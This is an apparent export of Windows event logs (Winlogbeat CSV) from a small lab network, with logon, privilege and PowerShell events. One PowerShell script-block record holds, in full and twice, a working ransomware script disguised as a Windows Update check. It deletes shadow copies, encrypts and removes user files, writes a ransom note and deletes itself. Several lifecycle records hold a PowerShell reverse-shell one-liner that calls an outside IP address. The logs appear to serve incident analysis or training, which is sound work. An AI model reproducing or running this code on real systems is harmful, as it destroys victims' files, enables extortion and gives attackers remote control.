			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,332","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28792,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:46.378",dHkbBIQByII7dpeE5TSi,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:10:48.110","Oct 23, 2022 @ 17:10:47.968",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):
<# 
https://www.powershellgallery.com/packages/PSWindowsUpdate/2.2.0.3 
2nd most downloaded package  (last 6 weeks)
#>

# Variables
$Mode = ""-encrypt""
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like ""*Win*"") {
    $Directory = $env:USERPROFILE
}
$PSRKey = """"
$slash = ""\""
$Readme = ""ransom_readme.txt""
$RansomUserPath = """"

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet(""Encrypt"", ""Decrypt"")]
        [String]$Mode,
 
        [Parameter(Mandatory = $true)]
        [String]$Key,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptText"")]
        [String]$Text,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptFile"")]
        [String]$Path)
 
    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256 
    }
 
    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
        switch ($Mode) {
 
            ""Encrypt"" {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) { break }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + "".canihelpyou"" 
                }
 
                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
 
            ""Decrypt"" {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path <# -ErrorAction SilentlyContinue #>
                    if (!$File.FullName) { break }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName.replace("".canihelpyou"", """") 
                }
 
                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
        }
    }
 
    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

function CreateReadme {
    $ReadmeTXT = ""Your files have been encrypted!`nBut don't worry, you can still recover them with the recovery key :) if you pay `$1,000,000,000 in ETH to 0x8589427373D6D84E98730D7795D8f6f8731FDA16`n""
    if (!(Test-Path ""$Directory$slash$Readme"")) {
        Add-Content -Path ""$Directory$slash$Readme"" -Value $ReadmeTXT 
        Add-Content -Path ""$Directory$slash$Readme"" -Value ""Recovery Key: $PSRKey `n"" 
    }
}
    
function EncryptFiles {
    $ExcludedFilesDirectories = 'C:\Users\UserManager.ps1', 'C:\Users\system.log', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SystemInit.cmd', 'C:\Users\system.conf', '*.canihelpyou', 'ransom_readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -Attributes !System -Exclude $ExcludedFilesDirectories -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
        # Don't encrypt the ransomware first if it is in user folder
        if ($i -ne $PSCommandPath) {
            Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i
        } else {
            $RansomUserPath = $i
        }
        Remove-Item $i 
    }
}

function DeleteShadows {
    # Requires administrator privileges
    Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.canihelpyou | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
        Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace("".canihelpyou"", """")
        Write-Host ""[+] $rfile is now decrypted"" -ForegroundColor Cyan 
    } ; Remove-Item ""$Directory$slash$Readme"" 
}

function CheckFiles { 
    $RFiles = Get-ChildItem $Directory  -Attributes !System -Recurse -filter *.canihelpyou ; if ($RFiles) { $RFiles | Remove-Item } else {
        Write-Host ""[!] No encrypted files has been found!"" -ForegroundColor Red 
    }
}

if ($Mode -eq ""-decrypt"") { 
    Write-Host ; Write-Host ""[!] Recovering ransomware infection on $DirectoryTarget directory.."" -ForegroundColor Red
    Write-Host ""[i] Applying recovery key on encrypted files.."" -ForegroundColor Green
    DecryptFiles ; CheckFiles
}
  
else {
    Write-Host ; Write-Host ""Checking for Windows updates via Windows Update Client..."" -ForegroundColor Cyan
    if ($OSVersion -like ""*Win*"") {
        DeleteShadows
    }
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
    Start-Sleep 1
    Write-Host ""Checking file hashes for Windows updates..."" -ForegroundColor Cyan
    CreateReadme
    EncryptFiles
    Start-Sleep 1

    Write-Host ""Saving Windows update status..."" -ForegroundColor Cyan
    Start-Sleep 2
    Write-Host ""Completed. No Windows updates were found."" -ForegroundColor Green
    # Self Delete
    if ($PSCommandPath -ne """") {
        rm $PSCommandPath -Force
    }
}

ScriptBlock ID: fd118f69-e1a0-491f-8dfc-9babb27446a9
Path: ","fd118f69-e1a0-491f-8dfc-9babb27446a9","<# 
https://www.powershellgallery.com/packages/PSWindowsUpdate/2.2.0.3 
2nd most downloaded package  (last 6 weeks)
#>

# Variables
$Mode = ""-encrypt""
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like ""*Win*"") {
    $Directory = $env:USERPROFILE
}
$PSRKey = """"
$slash = ""\""
$Readme = ""ransom_readme.txt""
$RansomUserPath = """"

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet(""Encrypt"", ""Decrypt"")]
        [String]$Mode,
 
        [Parameter(Mandatory = $true)]
        [String]$Key,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptText"")]
        [String]$Text,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptFile"")]
        [String]$Path)
 
    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256 
    }
 
    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
        switch ($Mode) {
 
            ""Encrypt"" {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) { break }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + "".canihelpyou"" 
                }
 
                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
 
            ""Decrypt"" {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path <# -ErrorAction SilentlyContinue #>
                    if (!$File.FullName) { break }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName.replace("".canihelpyou"", """") 
                }
 
                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
        }
    }
 
    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

function CreateReadme {
    $ReadmeTXT = ""Your files have been encrypted!`nBut don't worry, you can still recover them with the recovery key :) if you pay `$1,000,000,000 in ETH to 0x8589427373D6D84E98730D7795D8f6f8731FDA16`n""
    if (!(Test-Path ""$Directory$slash$Readme"")) {
        Add-Content -Path ""$Directory$slash$Readme"" -Value $ReadmeTXT 
        Add-Content -Path ""$Directory$slash$Readme"" -Value ""Recovery Key: $PSRKey `n"" 
    }
}
    
function EncryptFiles {
    $ExcludedFilesDirectories = 'C:\Users\UserManager.ps1', 'C:\Users\system.log', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SystemInit.cmd', 'C:\Users\system.conf', '*.canihelpyou', 'ransom_readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -Attributes !System -Exclude $ExcludedFilesDirectories -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
        # Don't encrypt the ransomware first if it is in user folder
        if ($i -ne $PSCommandPath) {
            Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i
        } else {
            $RansomUserPath = $i
        }
        Remove-Item $i 
    }
}

function DeleteShadows {
    # Requires administrator privileges
    Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.canihelpyou | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
        Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace("".canihelpyou"", """")
        Write-Host ""[+] $rfile is now decrypted"" -ForegroundColor Cyan 
    } ; Remove-Item ""$Directory$slash$Readme"" 
}

function CheckFiles { 
    $RFiles = Get-ChildItem $Directory  -Attributes !System -Recurse -filter *.canihelpyou ; if ($RFiles) { $RFiles | Remove-Item } else {
        Write-Host ""[!] No encrypted files has been found!"" -ForegroundColor Red 
    }
}

if ($Mode -eq ""-decrypt"") { 
    Write-Host ; Write-Host ""[!] Recovering ransomware infection on $DirectoryTarget directory.."" -ForegroundColor Red
    Write-Host ""[i] Applying recovery key on encrypted files.."" -ForegroundColor Green
    DecryptFiles ; CheckFiles
}
  
else {
    Write-Host ; Write-Host ""Checking for Windows updates via Windows Update Client..."" -ForegroundColor Cyan
    if ($OSVersion -like ""*Win*"") {
        DeleteShadows
    }
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
    Start-Sleep 1
    Write-Host ""Checking file hashes for Windows updates..."" -ForegroundColor Cyan
    CreateReadme
    EncryptFiles
    Start-Sleep 1

    Write-Host ""Saving Windows update status..."" -ForegroundColor Cyan
    Start-Sleep 2
    Write-Host ""Completed. No Windows updates were found."" -ForegroundColor Green
    # Self Delete
    if ($PSCommandPath -ne """") {
        rm $PSCommandPath -Force
    }
}",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-18","-","-","{1f14668e-e63b-0001-5cd5-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","6,252","5,848","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3376,"Execute a Remote Command","NT AUTHORITY","S-1-5-18",SYSTEM,User,1
"Oct 23, 2022 @ 17:10:40.520","cHkbBIQByII7dpeEzTS-",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 17:10:42.013","Oct 23, 2022 @ 17:10:41.851",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"6,332","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28789,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 17:10:40.520","cXkbBIQByII7dpeEzTS-",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 17:10:42.013","Oct 23, 2022 @ 17:10:41.853",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,332","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28790,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:24.627",tnkbBIQByII7dpeEijNa,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 17:10:24.782","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:24Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:24Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4783,"-","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.967",inkbBIQByII7dpeEdzNe,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:10:19.890","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=e66962fe-4311-46da-bb61-0d6336ad933d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=e66962fe-4311-46da-bb61-0d6336ad933d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4631,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.951",hHkbBIQByII7dpeEdzNe,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:19.890","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4625,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.951",hXkbBIQByII7dpeEdzNe,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:19.890","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
